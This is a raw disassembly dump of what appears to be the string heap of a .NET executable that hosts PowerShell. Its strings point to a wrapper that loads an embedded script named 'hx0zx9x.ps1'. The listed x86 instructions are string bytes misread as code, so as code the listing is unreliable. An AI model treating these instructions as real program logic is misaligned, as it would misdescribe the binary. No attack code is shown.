  4085dc:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4085e3:	6c                   	insb   (%dx),%es:(%edi)
  4085e4:	61                   	popa
  4085e5:	73 73                	jae    0x40865a
  4085e7:	36 00 4d 61          	add    %cl,%ss:0x61(%ebp)
  4085eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ec:	75 61                	jne    0x40864f
  4085ee:	6c                   	insb   (%dx),%es:(%edi)
  4085ef:	52                   	push   %edx
  4085f0:	65 73 65             	gs jae 0x408658
  4085f3:	74 45                	je     0x40863a
  4085f5:	76 65                	jbe    0x40865c
  4085f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f8:	74 00                	je     0x4085fa
  4085fa:	6d                   	insl   (%dx),%es:(%edi)
  4085fb:	72 65                	jb     0x408662
  4085fd:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  408601:	61                   	popa
  408602:	41                   	inc    %ecx
  408603:	64 64 65 64 45       	fs fs gs fs inc %ebp
  408608:	76 65                	jbe    0x40866f
  40860a:	6e                   	outsb  %ds:(%esi),(%dx)
  40860b:	74 41                	je     0x40864e
  40860d:	72 67                	jb     0x408676
  40860f:	73 00                	jae    0x408611
  408611:	3c 4d                	cmp    $0x4d,%al
  408613:	61                   	popa
  408614:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  40861b:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  408622:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  408625:	31 00                	xor    %eax,(%eax)
  408627:	49                   	dec    %ecx
  408628:	41                   	inc    %ecx
  408629:	73 79                	jae    0x4086a4
  40862b:	6e                   	outsb  %ds:(%esi),(%dx)
  40862c:	63 52 65             	arpl   %edx,0x65(%edx)
  40862f:	73 75                	jae    0x4086a6
  408631:	6c                   	insb   (%dx),%es:(%edi)
  408632:	74 00                	je     0x408634
  408634:	3c 4d                	cmp    $0x4d,%al
  408636:	61                   	popa
  408637:	69 6e 3e 62 5f 5f 32 	imul   $0x325f5f62,0x3e(%esi),%ebp
  40863e:	00 61 72             	add    %ah,0x72(%ecx)
  408641:	00 50 53             	add    %dl,0x53(%eax)
  408644:	44                   	inc    %esp
  408645:	61                   	popa
  408646:	74 61                	je     0x4086a9
  408648:	43                   	inc    %ebx
  408649:	6f                   	outsl  %ds:(%esi),(%dx)
  40864a:	6c                   	insb   (%dx),%es:(%edi)
  40864b:	6c                   	insb   (%dx),%es:(%edi)
  40864c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408651:	6e                   	outsb  %ds:(%esi),(%dx)
  408652:	60                   	pusha
  408653:	31 00                	xor    %eax,(%eax)
  408655:	45                   	inc    %ebp
  408656:	72 72                	jb     0x4086ca
  408658:	6f                   	outsl  %ds:(%esi),(%dx)
  408659:	72 52                	jb     0x4086ad
  40865b:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  40865f:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408663:	74 5f                	je     0x4086c4
  408665:	49                   	dec    %ecx
  408666:	6e                   	outsb  %ds:(%esi),(%dx)
  408667:	64 65 78 00          	fs gs js 0x40866b
  40866b:	67 65 74 5f          	addr16 gs je 0x4086ce
  40866f:	45                   	inc    %ebp
  408670:	78 63                	js     0x4086d5
  408672:	65 70 74             	gs jo  0x4086e9
  408675:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40867c:	5f                   	pop    %edi
  40867d:	4d                   	dec    %ebp
  40867e:	65 73 73             	gs jae 0x4086f4
  408681:	61                   	popa
  408682:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  408687:	74 5f                	je     0x4086e8
  408689:	49                   	dec    %ecx
  40868a:	73 43                	jae    0x4086cf
  40868c:	6f                   	outsl  %ds:(%esi),(%dx)
  40868d:	6d                   	insl   (%dx),%es:(%edi)
  40868e:	70 6c                	jo     0x4086fc
  408690:	65 74 65             	gs je  0x4086f8
  408693:	64 00 45 76          	add    %al,%fs:0x76(%ebp)
  408697:	65 6e                	outsb  %gs:(%esi),(%dx)
  408699:	74 57                	je     0x4086f2
  40869b:	61                   	popa
  40869c:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4086a3:	65 
  4086a4:	00 53 65             	add    %dl,0x65(%ebx)
  4086a7:	74 00                	je     0x4086a9
  4086a9:	45                   	inc    %ebp
  4086aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4086ab:	61                   	popa
  4086ac:	62 6c 65 56          	bound  %ebp,0x56(%ebp,%eiz,2)
  4086b0:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%ebx),%esi
  4086b7:	79 6c                	jns    0x408725
  4086b9:	65 73 00             	gs jae 0x4086bc
  4086bc:	55                   	push   %ebp
  4086bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4086be:	68 61 6e 64 6c       	push   $0x6c646e61
  4086c3:	65 64 45             	gs fs inc %ebp
  4086c6:	78 63                	js     0x40872b
  4086c8:	65 70 74             	gs jo  0x40873f
  4086cb:	69 6f 6e 45 76 65 6e 	imul   $0x6e657645,0x6e(%edi),%ebp
  4086d2:	74 48                	je     0x40871c
  4086d4:	61                   	popa
  4086d5:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d6:	64 6c                	fs insb (%dx),%es:(%edi)
  4086d8:	65 72 00             	gs jb  0x4086db
  4086db:	61                   	popa
  4086dc:	64 64 5f             	fs fs pop %edi
  4086df:	55                   	push   %ebp
  4086e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e1:	68 61 6e 64 6c       	push   $0x6c646e61
  4086e6:	65 64 45             	gs fs inc %ebp
  4086e9:	78 63                	js     0x40874e
  4086eb:	65 70 74             	gs jo  0x408762
  4086ee:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4086f5:	74 65                	je     0x40875c
  4086f7:	6d                   	insl   (%dx),%es:(%edi)
  4086f8:	2e 4d                	cs dec %ebp
  4086fa:	61                   	popa
  4086fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4086fc:	61                   	popa
  4086fd:	67 65 6d             	gs insl (%dx),%es:(%di)
  408700:	65 6e                	outsb  %gs:(%esi),(%dx)
  408702:	74 2e                	je     0x408732
  408704:	41                   	inc    %ecx
  408705:	75 74                	jne    0x40877b
  408707:	6f                   	outsl  %ds:(%esi),(%dx)
  408708:	6d                   	insl   (%dx),%es:(%edi)
  408709:	61                   	popa
  40870a:	74 69                	je     0x408775
  40870c:	6f                   	outsl  %ds:(%esi),(%dx)
  40870d:	6e                   	outsb  %ds:(%esi),(%dx)
  40870e:	2e 52                	cs push %edx
  408710:	75 6e                	jne    0x408780
  408712:	73 70                	jae    0x408784
  408714:	61                   	popa
  408715:	63 65 73             	arpl   %esp,0x73(%ebp)
  408718:	00 52 75             	add    %dl,0x75(%edx)
  40871b:	6e                   	outsb  %ds:(%esi),(%dx)
  40871c:	73 70                	jae    0x40878e
  40871e:	61                   	popa
  40871f:	63 65 46             	arpl   %esp,0x46(%ebp)
  408722:	61                   	popa
  408723:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  408727:	79 00                	jns    0x408729
  408729:	52                   	push   %edx
  40872a:	75 6e                	jne    0x40879a
  40872c:	73 70                	jae    0x40879e
  40872e:	61                   	popa
  40872f:	63 65 00             	arpl   %esp,0x0(%ebp)
  408732:	43                   	inc    %ebx
  408733:	72 65                	jb     0x40879a
  408735:	61                   	popa
  408736:	74 65                	je     0x40879d
  408738:	52                   	push   %edx
  408739:	75 6e                	jne    0x4087a9
  40873b:	73 70                	jae    0x4087ad
  40873d:	61                   	popa
  40873e:	63 65 00             	arpl   %esp,0x0(%ebp)
  408741:	41                   	inc    %ecx
  408742:	70 61                	jo     0x4087a5
  408744:	72 74                	jb     0x4087ba
  408746:	6d                   	insl   (%dx),%es:(%edi)
  408747:	65 6e                	outsb  %gs:(%esi),(%dx)
  408749:	74 53                	je     0x40879e
  40874b:	74 61                	je     0x4087ae
  40874d:	74 65                	je     0x4087b4
  40874f:	00 73 65             	add    %dh,0x65(%ebx)
  408752:	74 5f                	je     0x4087b3
  408754:	41                   	inc    %ecx
  408755:	70 61                	jo     0x4087b8
  408757:	72 74                	jb     0x4087cd
  408759:	6d                   	insl   (%dx),%es:(%edi)
  40875a:	65 6e                	outsb  %gs:(%esi),(%dx)
  40875c:	74 53                	je     0x4087b1
  40875e:	74 61                	je     0x4087c1
  408760:	74 65                	je     0x4087c7
  408762:	00 4f 70             	add    %cl,0x70(%edi)
  408765:	65 6e                	outsb  %gs:(%esi),(%dx)
  408767:	00 50 6f             	add    %dl,0x6f(%eax)
  40876a:	77 65                	ja     0x4087d1
  40876c:	72 53                	jb     0x4087c1
  40876e:	68 65 6c 6c 00       	push   $0x6c6c65
  408773:	43                   	inc    %ebx
  408774:	72 65                	jb     0x4087db
  408776:	61                   	popa
  408777:	74 65                	je     0x4087de
  408779:	00 73 65             	add    %dh,0x65(%ebx)
  40877c:	74 5f                	je     0x4087dd
  40877e:	52                   	push   %edx
  40877f:	75 6e                	jne    0x4087ef
  408781:	73 70                	jae    0x4087f3
  408783:	61                   	popa
  408784:	63 65 00             	arpl   %esp,0x0(%ebp)
  408787:	50                   	push   %eax
  408788:	53                   	push   %ebx
  408789:	44                   	inc    %esp
  40878a:	61                   	popa
  40878b:	74 61                	je     0x4087ee
  40878d:	53                   	push   %ebx
  40878e:	74 72                	je     0x408802
  408790:	65 61                	gs popa
  408792:	6d                   	insl   (%dx),%es:(%edi)
  408793:	73 00                	jae    0x408795
  408795:	67 65 74 5f          	addr16 gs je 0x4087f8
  408799:	53                   	push   %ebx
  40879a:	74 72                	je     0x40880e
  40879c:	65 61                	gs popa
  40879e:	6d                   	insl   (%dx),%es:(%edi)
  40879f:	73 00                	jae    0x4087a1
  4087a1:	67 65 74 5f          	addr16 gs je 0x408804
  4087a5:	45                   	inc    %ebp
  4087a6:	72 72                	jb     0x40881a
  4087a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a9:	72 00                	jb     0x4087ab
  4087ab:	45                   	inc    %ebp
  4087ac:	76 65                	jbe    0x408813
  4087ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4087af:	74 48                	je     0x4087f9
  4087b1:	61                   	popa
  4087b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4087b3:	64 6c                	fs insb (%dx),%es:(%edi)
  4087b5:	65 72 60             	gs jb  0x408818
  4087b8:	31 00                	xor    %eax,(%eax)
  4087ba:	61                   	popa
  4087bb:	64 64 5f             	fs fs pop %edi
  4087be:	44                   	inc    %esp
  4087bf:	61                   	popa
  4087c0:	74 61                	je     0x408823
  4087c2:	41                   	inc    %ecx
  4087c3:	64 64 65 64 00 43 6f 	fs fs gs add %al,%fs:0x6f(%ebx)
  4087ca:	6d                   	insl   (%dx),%es:(%edi)
  4087cb:	70 6c                	jo     0x408839
  4087cd:	65 74 65             	gs je  0x408835
  4087d0:	00 43 6f             	add    %al,0x6f(%ebx)
  4087d3:	6d                   	insl   (%dx),%es:(%edi)
  4087d4:	70 61                	jo     0x408837
  4087d6:	72 65                	jb     0x40883d
  4087d8:	00 53 74             	add    %dl,0x74(%ebx)
  4087db:	72 69                	jb     0x408846
  4087dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4087de:	67 43                	addr16 inc %ebx
  4087e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e1:	6d                   	insl   (%dx),%es:(%edi)
  4087e2:	70 61                	jo     0x408845
  4087e4:	72 69                	jb     0x40884f
  4087e6:	73 6f                	jae    0x408857
  4087e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4087e9:	00 53 74             	add    %dl,0x74(%ebx)
  4087ec:	61                   	popa
  4087ed:	72 74                	jb     0x408863
  4087ef:	73 57                	jae    0x408848
  4087f1:	69 74 68 00 53 74 72 	imul   $0x69727453,0x0(%eax,%ebp,2),%esi
  4087f8:	69 
  4087f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4087fa:	67 53                	addr16 push %ebx
  4087fc:	70 6c                	jo     0x40886a
  4087fe:	69 74 4f 70 74 69 6f 	imul   $0x6e6f6974,0x70(%edi,%ecx,2),%esi
  408805:	6e 
  408806:	73 00                	jae    0x408808
  408808:	53                   	push   %ebx
  408809:	70 6c                	jo     0x408877
  40880b:	69 74 00 4d 65 73 73 	imul   $0x61737365,0x4d(%eax,%eax,1),%esi
  408812:	61 
  408813:	67 65 42             	addr16 gs inc %edx
  408816:	6f                   	outsl  %ds:(%esi),(%dx)
  408817:	78 42                	js     0x40885b
  408819:	75 74                	jne    0x40888f
  40881b:	74 6f                	je     0x40888c
  40881d:	6e                   	outsb  %ds:(%esi),(%dx)
  40881e:	73 00                	jae    0x408820
  408820:	4d                   	dec    %ebp
  408821:	65 73 73             	gs jae 0x408897
  408824:	61                   	popa
  408825:	67 65 42             	addr16 gs inc %edx
  408828:	6f                   	outsl  %ds:(%esi),(%dx)
  408829:	78 49                	js     0x408874
  40882b:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  40882e:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408832:	6d                   	insl   (%dx),%es:(%edi)
  408833:	00 53 79             	add    %dl,0x79(%ebx)
  408836:	73 74                	jae    0x4088ac
  408838:	65 6d                	gs insl (%dx),%es:(%edi)
  40883a:	2e 44                	cs inc %esp
  40883c:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408843:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  40884a:	75 67                	jne    0x4088b3
  40884c:	67 65 72 00          	addr16 gs jb 0x408850
  408850:	4c                   	dec    %esp
  408851:	61                   	popa
  408852:	75 6e                	jne    0x4088c2
  408854:	63 68 00             	arpl   %ebp,0x0(%eax)
  408857:	53                   	push   %ebx
  408858:	79 73                	jns    0x4088cd
  40885a:	74 65                	je     0x4088c1
  40885c:	6d                   	insl   (%dx),%es:(%edi)
  40885d:	2e 49                	cs dec %ecx
  40885f:	4f                   	dec    %edi
  408860:	00 53 74             	add    %dl,0x74(%ebx)
  408863:	72 65                	jb     0x4088ca
  408865:	61                   	popa
  408866:	6d                   	insl   (%dx),%es:(%edi)
  408867:	00 47 65             	add    %al,0x65(%edi)
  40886a:	74 4d                	je     0x4088b9
  40886c:	61                   	popa
  40886d:	6e                   	outsb  %ds:(%esi),(%dx)
  40886e:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  408875:	73 6f                	jae    0x4088e6
  408877:	75 72                	jne    0x4088eb
  408879:	63 65 53             	arpl   %esp,0x53(%ebp)
  40887c:	74 72                	je     0x4088f0
  40887e:	65 61                	gs popa
  408880:	6d                   	insl   (%dx),%es:(%edi)
  408881:	00 45 6e             	add    %al,0x6e(%ebp)
  408884:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408887:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40888e:	5f                   	pop    %edi
  40888f:	55                   	push   %ebp
  408890:	54                   	push   %esp
  408891:	46                   	inc    %esi
  408892:	38 00                	cmp    %al,(%eax)
  408894:	53                   	push   %ebx
  408895:	74 72                	je     0x408909
  408897:	65 61                	gs popa
  408899:	6d                   	insl   (%dx),%es:(%edi)
  40889a:	52                   	push   %edx
  40889b:	65 61                	gs popa
  40889d:	64 65 72 00          	fs gs jb 0x4088a1
  4088a1:	54                   	push   %esp
  4088a2:	65 78 74             	gs js  0x408919
  4088a5:	52                   	push   %edx
  4088a6:	65 61                	gs popa
  4088a8:	64 65 72 00          	fs gs jb 0x4088ac
  4088ac:	52                   	push   %edx
  4088ad:	65 61                	gs popa
  4088af:	64 54                	fs push %esp
  4088b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b2:	45                   	inc    %ebp
  4088b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b4:	64 00 46 69          	add    %al,%fs:0x69(%esi)
  4088b8:	6c                   	insb   (%dx),%es:(%edi)
  4088b9:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4088bd:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  4088c4:	65 
  4088c5:	78 74                	js     0x40893b
  4088c7:	00 41 64             	add    %al,0x64(%ecx)
  4088ca:	64 53                	fs push %ebx
  4088cc:	63 72 69             	arpl   %esi,0x69(%edx)
  4088cf:	70 74                	jo     0x408945
  4088d1:	00 53 79             	add    %dl,0x79(%ebx)
  4088d4:	73 74                	jae    0x40894a
  4088d6:	65 6d                	gs insl (%dx),%es:(%edi)
  4088d8:	2e 54                	cs push %esp
  4088da:	65 78 74             	gs js  0x408951
  4088dd:	2e 52                	cs push %edx
  4088df:	65 67 75 6c          	gs addr16 jne 0x40894f
  4088e3:	61                   	popa
  4088e4:	72 45                	jb     0x40892b
  4088e6:	78 70                	js     0x408958
  4088e8:	72 65                	jb     0x40894f
  4088ea:	73 73                	jae    0x40895f
  4088ec:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  4088f3:	67 65 78 00          	addr16 gs js 0x4088f7
  4088f7:	4d                   	dec    %ebp
  4088f8:	61                   	popa
  4088f9:	74 63                	je     0x40895e
  4088fb:	68 00 47 72 6f       	push   $0x6f724700
  408900:	75 70                	jne    0x408972
  408902:	00 67 65             	add    %ah,0x65(%edi)
  408905:	74 5f                	je     0x408966
  408907:	53                   	push   %ebx
  408908:	75 63                	jne    0x40896d
  40890a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40890d:	73 00                	jae    0x40890f
  40890f:	47                   	inc    %edi
  408910:	72 6f                	jb     0x408981
  408912:	75 70                	jne    0x408984
  408914:	43                   	inc    %ebx
  408915:	6f                   	outsl  %ds:(%esi),(%dx)
  408916:	6c                   	insb   (%dx),%es:(%edi)
  408917:	6c                   	insb   (%dx),%es:(%edi)
  408918:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40891d:	6e                   	outsb  %ds:(%esi),(%dx)
  40891e:	00 67 65             	add    %ah,0x65(%edi)
  408921:	74 5f                	je     0x408982
  408923:	47                   	inc    %edi
  408924:	72 6f                	jb     0x408995
  408926:	75 70                	jne    0x408998
  408928:	73 00                	jae    0x40892a
  40892a:	44                   	inc    %esp
  40892b:	6f                   	outsl  %ds:(%esi),(%dx)
  40892c:	75 62                	jne    0x408990
  40892e:	6c                   	insb   (%dx),%es:(%edi)
  40892f:	65 00 54 72 79       	add    %dl,%gs:0x79(%edx,%esi,2)
  408934:	50                   	push   %eax
  408935:	61                   	popa
  408936:	72 73                	jb     0x4089ab
  408938:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  40893c:	64 50                	fs push %eax
  40893e:	61                   	popa
  40893f:	72 61                	jb     0x4089a2
  408941:	6d                   	insl   (%dx),%es:(%edi)
  408942:	65 74 65             	gs je  0x4089aa
  408945:	72 00                	jb     0x408947
  408947:	43                   	inc    %ebx
  408948:	61                   	popa
  408949:	70 74                	jo     0x4089bf
  40894b:	75 72                	jne    0x4089bf
  40894d:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408951:	74 5f                	je     0x4089b2
  408953:	56                   	push   %esi
  408954:	61                   	popa
  408955:	6c                   	insb   (%dx),%es:(%edi)
  408956:	75 65                	jne    0x4089bd
  408958:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  40895c:	70 70                	jo     0x4089ce
  40895e:	65 72 00             	gs jb  0x408961
  408961:	42                   	inc    %edx
  408962:	6f                   	outsl  %ds:(%esi),(%dx)
  408963:	6f                   	outsl  %ds:(%esi),(%dx)
  408964:	6c                   	insb   (%dx),%es:(%edi)
  408965:	65 61                	gs popa
  408967:	6e                   	outsb  %ds:(%esi),(%dx)
  408968:	00 41 64             	add    %al,0x64(%ecx)
  40896b:	64 41                	fs inc %ecx
  40896d:	72 67                	jb     0x4089d6
  40896f:	75 6d                	jne    0x4089de
  408971:	65 6e                	outsb  %gs:(%esi),(%dx)
  408973:	74 00                	je     0x408975
  408975:	41                   	inc    %ecx
  408976:	64 64 43             	fs fs inc %ebx
  408979:	6f                   	outsl  %ds:(%esi),(%dx)
  40897a:	6d                   	insl   (%dx),%es:(%edi)
  40897b:	6d                   	insl   (%dx),%es:(%edi)
  40897c:	61                   	popa
  40897d:	6e                   	outsb  %ds:(%esi),(%dx)
  40897e:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  408982:	79 6e                	jns    0x4089f2
  408984:	63 43 61             	arpl   %eax,0x61(%ebx)
  408987:	6c                   	insb   (%dx),%es:(%edi)
  408988:	6c                   	insb   (%dx),%es:(%edi)
  408989:	62 61 63             	bound  %esp,0x63(%ecx)
  40898c:	6b 00 50             	imul   $0x50,(%eax),%eax
  40898f:	53                   	push   %ebx
  408990:	49                   	dec    %ecx
  408991:	6e                   	outsb  %ds:(%esi),(%dx)
  408992:	76 6f                	jbe    0x408a03
  408994:	63 61 74             	arpl   %esp,0x74(%ecx)
  408997:	69 6f 6e 53 65 74 74 	imul   $0x74746553,0x6e(%edi),%ebp
  40899e:	69 6e 67 73 00 42 65 	imul   $0x65420073,0x67(%esi),%ebp
  4089a5:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  4089ac:	6b 
  4089ad:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  4089b1:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  4089b8:	65 
  4089b9:	00 57 61             	add    %dl,0x61(%edi)
  4089bc:	69 74 4f 6e 65 00 50 	imul   $0x53500065,0x6e(%edi,%ecx,2),%esi
  4089c3:	53 
  4089c4:	49                   	dec    %ecx
  4089c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c6:	76 6f                	jbe    0x408a37
  4089c8:	63 61 74             	arpl   %esp,0x74(%ecx)
  4089cb:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4089d2:	65 49                	gs dec %ecx
  4089d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4089d7:	00 67 65             	add    %ah,0x65(%edi)
  4089da:	74 5f                	je     0x408a3b
  4089dc:	49                   	dec    %ecx
  4089dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4089de:	76 6f                	jbe    0x408a4f
  4089e0:	63 61 74             	arpl   %esp,0x74(%ecx)
  4089e3:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4089ea:	65 49                	gs dec %ecx
  4089ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4089ed:	66 6f                	outsw  %ds:(%esi),(%dx)
  4089ef:	00 50 53             	add    %dl,0x53(%eax)
  4089f2:	49                   	dec    %ecx
  4089f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f4:	76 6f                	jbe    0x408a65
  4089f6:	63 61 74             	arpl   %esp,0x74(%ecx)
  4089f9:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  408a00:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408a04:	74 5f                	je     0x408a65
  408a06:	53                   	push   %ebx
  408a07:	74 61                	je     0x408a6a
  408a09:	74 65                	je     0x408a70
  408a0b:	00 67 65             	add    %ah,0x65(%edi)
  408a0e:	74 5f                	je     0x408a6f
  408a10:	52                   	push   %edx
  408a11:	65 61                	gs popa
  408a13:	73 6f                	jae    0x408a84
  408a15:	6e                   	outsb  %ds:(%esi),(%dx)
  408a16:	00 43 6f             	add    %al,0x6f(%ebx)
  408a19:	6d                   	insl   (%dx),%es:(%edi)
  408a1a:	70 69                	jo     0x408a85
  408a1c:	6c                   	insb   (%dx),%es:(%edi)
  408a1d:	65 72 47             	gs jb  0x408a67
  408a20:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a22:	65 72 61             	gs jb  0x408a86
  408a25:	74 65                	je     0x408a8c
  408a27:	64 41                	fs inc %ecx
  408a29:	74 74                	je     0x408a9f
  408a2b:	72 69                	jb     0x408a96
  408a2d:	62 75 74             	bound  %esi,0x74(%ebp)
  408a30:	65 00 68 78          	add    %ch,%gs:0x78(%eax)
  408a34:	30 7a 78             	xor    %bh,0x78(%edx)
  408a37:	39 78 2e             	cmp    %edi,0x2e(%eax)
  408a3a:	70 73                	jo     0x408aaf
  408a3c:	31 00                	xor    %eax,(%eax)
  408a3e:	00 00                	add    %al,(%eax)
  408a40:	00 01                	add    %al,(%ecx)
  408a42:	00 21                	add    %ah,(%ecx)
  408a44:	53                   	push   %ebx
  408a45:	00 65 00             	add    %ah,0x0(%ebp)
  408a48:	63 00                	arpl   %eax,(%eax)
  408a4a:	75 00                	jne    0x408a4c
  408a4c:	72 00                	jb     0x408a4e
  408a4e:	65 00 20             	add    %ah,%gs:(%eax)
  408a51:	00 69 00             	add    %ch,0x0(%ecx)
  408a54:	6e                   	outsb  %ds:(%esi),(%dx)
  408a55:	00 70 00             	add    %dh,0x0(%eax)
  408a58:	75 00                	jne    0x408a5a
  408a5a:	74 00                	je     0x408a5c
  408a5c:	3a 00                	cmp    (%eax),%al
  408a5e:	20 00                	and    %al,(%eax)
  408a60:	20 00                	and    %al,(%eax)
  408a62:	20 00                	and    %al,(%eax)
  408a64:	00 21                	add    %ah,(%ecx)
  408a66:	49                   	dec    %ecx
  408a67:	00 6e 00             	add    %ch,0x0(%esi)
  408a6a:	70 00                	jo     0x408a6c
  408a6c:	75 00                	jne    0x408a6e
  408a6e:	74 00                	je     0x408a70
  408a70:	3a 00                	cmp    (%eax),%al
  408a72:	20 00                	and    %al,(%eax)
  408a74:	20 00                	and    %al,(%eax)
  408a76:	20 00                	and    %al,(%eax)
  408a78:	20 00                	and    %al,(%eax)
  408a7a:	20 00                	and    %al,(%eax)
  408a7c:	20 00                	and    %al,(%eax)
  408a7e:	20 00                	and    %al,(%eax)
  408a80:	20 00                	and    %al,(%eax)
  408a82:	20 00                	and    %al,(%eax)
  408a84:	20 00                	and    %al,(%eax)
  408a86:	00 05 4f 00 4b 00    	add    %al,0x4b004f
  408a8c:	00 0d 43 00 61 00    	add    %cl,0x610043
  408a92:	6e                   	outsb  %ds:(%esi),(%dx)
  408a93:	00 63 00             	add    %ah,0x0(%ebx)
  408a96:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  408a9b:	03 00                	add    (%eax),%eax
  408a9d:	00 01                	add    %al,(%ecx)
  408a9f:	17                   	pop    %ss
  408aa0:	50                   	push   %eax
  408aa1:	00 72 00             	add    %dh,0x0(%edx)
  408aa4:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408aa8:	73 00                	jae    0x408aaa
  408aaa:	20 00                	and    %al,(%eax)
  408aac:	61                   	popa
  408aad:	00 20                	add    %ah,(%eax)
  408aaf:	00 6b 00             	add    %ch,0x0(%ebx)
  408ab2:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  408ab6:	00 0f                	add    %cl,(%edi)
  408ab8:	23 00                	and    (%eax),%eax
  408aba:	30 00                	xor    %al,(%eax)
  408abc:	30 00                	xor    %al,(%eax)
  408abe:	30 00                	xor    %al,(%eax)
  408ac0:	30 00                	xor    %al,(%eax)
  408ac2:	38 00                	cmp    %al,(%eax)
  408ac4:	30 00                	xor    %al,(%eax)
  408ac6:	00 0f                	add    %cl,(%edi)
  408ac8:	23 00                	and    (%eax),%eax
  408aca:	38 00                	cmp    %al,(%eax)
  408acc:	30 00                	xor    %al,(%eax)
  408ace:	38 00                	cmp    %al,(%eax)
  408ad0:	30 00                	xor    %al,(%eax)
  408ad2:	38 00                	cmp    %al,(%eax)
  408ad4:	30 00                	xor    %al,(%eax)
  408ad6:	00 0f                	add    %cl,(%edi)
  408ad8:	23 00                	and    (%eax),%eax
  408ada:	30 00                	xor    %al,(%eax)
  408adc:	30 00                	xor    %al,(%eax)
  408ade:	38 00                	cmp    %al,(%eax)
  408ae0:	30 00                	xor    %al,(%eax)
  408ae2:	30 00                	xor    %al,(%eax)
  408ae4:	30 00                	xor    %al,(%eax)
  408ae6:	00 0f                	add    %cl,(%edi)
  408ae8:	23 00                	and    (%eax),%eax
  408aea:	30 00                	xor    %al,(%eax)
  408aec:	30 00                	xor    %al,(%eax)
  408aee:	38 00                	cmp    %al,(%eax)
  408af0:	30 00                	xor    %al,(%eax)
  408af2:	38 00                	cmp    %al,(%eax)
  408af4:	30 00                	xor    %al,(%eax)
  408af6:	00 0f                	add    %cl,(%edi)
  408af8:	23 00                	and    (%eax),%eax
  408afa:	38 00                	cmp    %al,(%eax)
  408afc:	30 00                	xor    %al,(%eax)
  408afe:	30 00                	xor    %al,(%eax)
  408b00:	30 00                	xor    %al,(%eax)
  408b02:	38 00                	cmp    %al,(%eax)
  408b04:	30 00                	xor    %al,(%eax)
  408b06:	00 0f                	add    %cl,(%edi)
  408b08:	23 00                	and    (%eax),%eax
  408b0a:	38 00                	cmp    %al,(%eax)
  408b0c:	30 00                	xor    %al,(%eax)
  408b0e:	30 00                	xor    %al,(%eax)
  408b10:	30 00                	xor    %al,(%eax)
  408b12:	30 00                	xor    %al,(%eax)
  408b14:	30 00                	xor    %al,(%eax)
  408b16:	00 0f                	add    %cl,(%edi)
  408b18:	23 00                	and    (%eax),%eax
  408b1a:	38 00                	cmp    %al,(%eax)
  408b1c:	30 00                	xor    %al,(%eax)
  408b1e:	38 00                	cmp    %al,(%eax)
  408b20:	30 00                	xor    %al,(%eax)
